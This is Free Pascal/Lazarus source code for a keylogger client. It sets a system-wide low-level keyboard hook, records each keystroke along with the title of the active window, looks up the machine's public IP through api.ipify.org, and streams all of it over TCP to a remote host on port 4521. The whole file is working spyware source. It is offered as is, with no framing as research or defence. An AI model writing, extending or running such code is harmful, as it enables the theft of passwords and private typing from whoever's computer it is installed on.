unit MainUnit;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, FileUtil, Forms, Controls, Graphics, Dialogs, StdCtrls,
  IdTCPClient, IdGlobal, IdIOHandler, Windows, jwawinuser, IdHTTP, IdContext;

type
  TConnectionThread = class(TThread)
  protected
    procedure Execute; override;
    procedure ConnectAndSendIP;
  public
    constructor Create(CreateSuspended: boolean);
  end;


type

  { TClientSideForm }

  TClientSideForm = class(TForm)
    StatusButton: TButton;
    HostIPEdit: TEdit;

    TCPClient: TIdTCPClient;

    procedure StatusButtonClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure SendPacket(needToSendWindowName: boolean);

    procedure ClientOnConnected(Sender: TObject);
    procedure ClientOnDisconnected(Sender: TObject);
  private
    { private declarations }
    sendingData: Int64;
    sendingWindowName: wideString;
    currWindowName: wideString;

  public
    { public declarations }
  end;

var
  ClientSideForm: TClientSideForm;

  lowLevelKeyboardHook: HHOOK;

  toggleOn: boolean;

  transmittingInfo: boolean;

  lastKeyCode: longInt = -1;

implementation

{$R *.lfm}


{ TConnectionThread }

constructor TConnectionThread.Create(CreateSuspended: boolean);
begin
  inherited Create(CreateSuspended);
  FreeOnTerminate := true;
end;

procedure TConnectionThread.ConnectAndSendIP();
var
  publicIP: string;
  IPHttp: TIdHTTP;
  i: longInt;
begin
  transmittingInfo := true;

  IPHttp := TIdHTTP.Create;

  publicIP := IPHttp.Get('https://api.ipify.org');

  publicIP := '<clientIp>' + publicIP;

  try
     ClientSideForm.TCPClient.IOHandler.Write(Int64(1337));
     for i:=1 to Length(publicIP) do
     begin
       ClientSideForm.TCPClient.IOHandler.Write(Int64(publicIP[i]));
     end;
     ClientSideForm.TCPClient.IOHandler.Write(Int64(1338));

     if (ClientSideForm.TCPClient.Connected) then
     begin
      toggleOn := true;
      ClientSideForm.StatusButton.Caption := 'Turn Off';
     end;
     //for i:=1 to Length(publicIP) do
     //begin
     //  ClientSideForm.TCPClient.IOHandler.Write(Int64(publicIP[i]));
     //end;
  except
    on E: Exception do
    begin
      showMessage(E.Message);
    end;
  end;

  transmittingInfo := false;
end;

procedure TConnectionThread.Execute();
begin
  ConnectAndSendIP;
end;

{ \TConnectionThread }


{ TClientSideForm }


function isBitSet(const AValueToCheck, ABitIndex: LongInt): Boolean;
begin
  Result := AValueToCheck and (1 shl ABitIndex) <> 0;
end;


function keyNotTypable(vKeyCode: longInt): Boolean;
begin
  if       (vKeyCode = VK_TAB)
        or (vKeyCode = VK_CAPITAL)
        or (vKeyCode = VK_LSHIFT)
        or (vKeyCode = VK_RSHIFT)
        or (vKeyCode = VK_LCONTROL)
        or (vKeyCode = VK_RCONTROL)
        or (vKeyCode = VK_LWIN)
        or (vKeyCode = VK_RWIN)
        or (vKeyCode = VK_LMENU)
        or (vKeyCode = VK_RMENU)
        or (vKeyCode in [32..47])
        or (vKeyCode in [112..135])
        or (vKeyCode in [144..145]) then
  begin
    result := true;
  end
  else
  begin
    result := false;
  end;
end;

function keyboardHookProc(nCode: longInt; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  KBInfoStruct: ^KBDLLHOOKSTRUCT;
  vKeyCode: LONG;
  scanCode: LONG;

  keyboardState: array[0..255] of Byte;
  keyboardLayout: HKL;

  keyPressedBuffer: array[0..9] of WideChar;
  keyPressedSize: LongInt;

  isCtrlDown: boolean;

  i: longInt;

  foregroundWindow: HWND;
  foregroundThreadPId: DWORD;
  foregroundWindowTitle: wideString;
  foregroundWindowTitleLength: longInt;

  encodedVirtualKeyCodeNotPrintable: Int64 = 0;
begin
  if (nCode < 0) or ((wParam <> WM_KEYDOWN) and (wParam <> WM_SYSKEYDOWN)) or (transmittingInfo) then // if the nCode<0 or the key is now pressed down
  begin
    if (wParam = WM_KEYUP) or (wParam = WM_SYSKEYUP) then
    begin
      lastKeyCode := -1;
    end;

    result := CallNextHookEx(0, nCode, wParam, lParam);
    exit;
  end;
  //ClientSideForm.HostIPEdit.Text := IntToStr(shit);

  KBInfoStruct := PKBDLLHOOKSTRUCT(lParam);

  //ClientSideForm.HostIPEdit.Text := IntTostr(KBInfoStruct^.flags);

  vKeyCode := KBInfoStruct^.vkCode;
  scanCode := KBInfoStruct^.scanCode;


  isCtrlDown := (isBitSet(GetKeyState(VK_CONTROL), 15)) or (isBitSet(GetKeyState(VK_LCONTROL), 15)) or (isBitSet(GetKeyState(VK_RCONTROL), 15));

  getKeyboardState(@keyboardState[0]);

  if (isCtrlDown) and ((vKeyCode <> VK_LCONTROL) or (vKeyCode <> VK_RCONTROL) or (vKeyCode <> VK_CONTROL)) then
  begin
    keyboardState[VK_CONTROL] := 0;
    keyboardState[VK_LCONTROL] := 0;
    keyboardState[VK_RCONTROL] := 0;
  end;

  foregroundWindow := GetForegroundWindow();
  foregroundThreadPId := GetWindowThreadProcessId(foregroundWindow, LPDWORD(0));
  keyboardLayout := GetKeyboardLayout(foregroundThreadPId);
  keyPressedSize := ToUnicodeEx(vKeyCode, scanCode, keyboardState, @keyPressedBuffer[0], 9, 0, keyboardLayout);

  // process info
  SetLength(foregroundWindowTitle, 400);
  foregroundWindowTitleLength := GetWindowTextW(foregroundWindow, @foregroundWindowTitle[1], 400);
  SetLength(foregroundWindowTitle, foregroundWindowTitleLength);

  if (lastKeyCode <> vKeyCode) and (keyNotTypable(vKeyCode)) then
  begin
    // Encode the VK code of out NOT PRINTABLE key into the remaining 48 bits and set the high order bit to 1 to signify that it's unprintable
    encodedVirtualKeyCodeNotPrintable := encodedVirtualKeyCodeNotPrintable or (1 << 63);
    encodedVirtualKeyCodeNotPrintable := encodedVirtualKeyCodeNotPrintable or (Int64(vKeyCode) << (63 - 8));

    // And send it!
    ClientSideForm.sendingData := encodedVirtualKeyCodeNotPrintable;

    ClientSideForm.currWindowName:=foregroundWindowTitle;
    //ClientSideForm.Caption:=ClientSideForm.currWindowName;
    if (ClientSideForm.currWindowName <> ClientSideForm.sendingWindowName) then
    begin
      ClientSideForm.sendingWindowName := ClientSideForm.currWindowName;
      ClientSideForm.SendPacket(true);
    end
    else
    begin
      ClientSideForm.SendPacket(false);
    end;

    lastKeyCode := vKeyCode;

    exit(CallNextHookEx(0, nCode, wParam, lParam));
  end;

  //ClientSideForm.HostIPEdit.Text := ClientSideForm.HostIPEdit.Text + IntToStr(keyPressedSize);


  if (lastKeyCode <> vKeyCode) and (keyPressedSize = 1) then // no tab and no esc
  begin
    ClientSideForm.currWindowName:=foregroundWindowTitle;
    //ClientSideForm.Caption:=ClientSideForm.currWindowName;

    ClientSideForm.sendingData := Int64(keyPressedBuffer[0]);

    if (ClientSideForm.currWindowName <> ClientSideForm.sendingWindowName) then
    begin
      ClientSideForm.sendingWindowName := ClientSideForm.currWindowName;
      ClientSideForm.SendPacket(true);
    end
    else
    begin
      ClientSideForm.SendPacket(false);
    end;

    for i:=0 to 255 do
    begin
      keyboardState[i] := 0;
    end;

    lastKeyCode := vKeyCode;
    ToUnicodeEx(vKeyCode, scanCode, keyboardState, @keyPressedBuffer[0], 9, 0, keyboardLayout);
  end;

  //ClientSideForm.HostIPEdit.Text := ClientSideForm.HostIPEdit.Text + IntToStr(Int16(ClientSideForm.sendingData));
  result := CallNextHookEx(0, nCode, wParam, lParam);
end;

procedure TClientSideForm.SendPacket(needToSendWindowName: boolean);
var
  i: longInt;
  windowNameToSend: wideString;
begin
  // send
  if not(toggleON) then
  begin
    exit;
  end;

  if (needToSendWindowName) then
  begin
    transmittingInfo := true;

    windowNameToSend := '<windowInfo>' + SendingWindowName;

    try
       ClientSideForm.TCPClient.IOHandler.Write(Int64(1337));
       for i:=1 to Length(windowNameToSend) do
       begin
         ClientSideForm.TCPClient.IOHandler.Write(Int64(windowNameToSend[i]));
       end;
       ClientSideForm.TCPClient.IOHandler.Write(Int64(1338));
       //for i:=1 to Length(windowNameToSend) do
       //begin
       //  ClientSideForm.TCPClient.IOHandler.Write(Int64(windowNameToSend[i]));
       //end;
    except
      on E: Exception do
      begin
        showMessage(E.Message);
      end;
    end;

    transmittingInfo := false;
  end;


  try
    TCPClient.IOHandler.Write(Int64(sendingData), true);
  except
    on E: Exception do
    begin
      showMessage(E.Message);
    end;
  end;
end;

procedure TClientSideForm.ClientOnConnected(Sender: TObject);
var
  ConnectionThrd: TConnectionThread;
begin
  ConnectionThrd := TConnectionThread.Create(true);

  ConnectionThrd.Start;
end;

procedure TClientSideForm.ClientOnDisconnected(Sender: TObject);
begin
  //
  toggleOn := false;
  StatusButton.Caption := 'Turn On';
end;

procedure TClientSideForm.FormCreate(Sender: TObject);
begin
  TCPClient := TIdTCPClient.Create;

  TCPClient.OnConnected:=@ClientOnConnected;
  TCPClient.OnDisconnected:=@ClientOnDisconnected;

  lowLevelKeyboardHook := SetWindowsHookEx(WH_KEYBOARD_LL, @keyboardHookProc, HInstance, 0);

  transmittingInfo := false;

  if (lowLevelKeyboardHook = 0) then
  begin
    ShowMessage('Could not establish a low-level keyboard hook!');
    Abort;
  end;
end;

procedure TClientSideForm.StatusButtonClick(Sender: TObject);
begin
  if (toggleOn) then
  begin
    // Turn off
    TCPClient.Disconnect;
  end
  else
  begin
    // Turn on
    TCPClient.Host := HostIPEdit.Text;
    TCPClient.Port := 4521;
    TCPClient.ConnectTimeout := 50000;
    TCPClient.ReadTimeout := 10000;
    TCPClient.IPVersion := TIdIPVersion.Id_IPv4;

    try
      TCPClient.Connect;
      TCPClient.IOHandler.LargeStream:=true;
    except
      on E: Exception do
      begin
        //
        ShowMessage(E.Message);
        exit;
      end;
    end;
  end;
end;

procedure TClientSideForm.FormDestroy(Sender: TObject);
begin
  UnhookWindowsHookEx(lowLevelKeyboardHook);
end;

end.

